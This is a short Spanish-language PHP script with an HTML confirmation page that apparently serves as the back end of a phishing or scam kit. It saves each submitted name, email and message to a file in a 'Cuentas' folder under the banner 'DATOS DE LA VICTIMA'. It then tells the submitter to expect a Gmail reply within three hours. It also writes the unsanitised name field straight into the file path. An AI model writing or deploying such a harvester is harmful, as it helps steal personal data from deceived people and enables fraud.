<?php

$nombre = $_POST["nombre"];
$email = $_POST["email"];
$mensaje = $_POST["mensaje"];

$contenido = "
┌═════════════════════┐
█ DATOS DE LA VICTIMA █
└═════════════════════┘
NOMBRE: $nombre
EMAIL: $email
MENSAJE: $mensaje
";

$archivo = fopen("Cuentas/$nombre.txt", "w");
fwrite($archivo, $contenido);

?>
</head>
<body>
<div align="center">
<h2>Info enviada correctamente</h2>
</div>
<p>
Espera la respuesta en tu gmail a más tardar en 3 horas
</p>
<div><a href="contacto.html">Regresar a la pagina anterior</a></div>
</body>
</html>